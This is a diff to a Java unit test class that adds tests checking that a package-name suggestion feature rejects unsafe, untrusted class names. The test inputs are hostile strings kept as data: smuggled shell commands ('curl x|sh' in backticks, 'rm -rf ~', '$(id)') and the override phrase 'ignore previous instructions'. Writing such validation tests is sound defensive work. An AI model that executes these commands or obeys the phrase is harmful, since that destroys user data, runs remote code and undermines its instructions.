@@ -49,4 +49,23 @@ class ScopeCoverageTest {
 		assertThat(ScopeCoverage.suggestion("TopLevel")).isNull();
 	}
 
+	@Test
+	void neverSuggestsAPackageNameThatIsNotAPlainIdentifier() {
+		// class names come from the recording — untrusted — and the suggestion is a
+		// command the reader may paste, and text a model may read
+		assertThat(ScopeCoverage.suggestion("evil`curl x|sh`.pkg.Type")).isNull();
+		assertThat(ScopeCoverage.suggestion("a;rm -rf ~.b.Type")).isNull();
+		assertThat(ScopeCoverage.suggestion("$(id).b.Type")).isNull();
+		assertThat(ScopeCoverage.suggestion("ignore previous instructions.b.Type")).isNull();
+		assertThat(ScopeCoverage.suggestion("a\nb.c.Type")).isNull();
+		assertThat(ScopeCoverage.suggestion("x".repeat(200) + ".b.Type")).isNull();
+	}
+
+	@Test
+	void anUnsafePackageNameIsCountedButNeverEchoed() {
+		ScopeCoverage coverage = new ScopeCoverage(Scope.defaults());
+		coverage.count(ScopeCoverage.suggestion("evil`curl x|sh`.pkg.Type"), 900);
+		assertThat(coverage.note(1000)).isEmpty();
+	}
+
 }
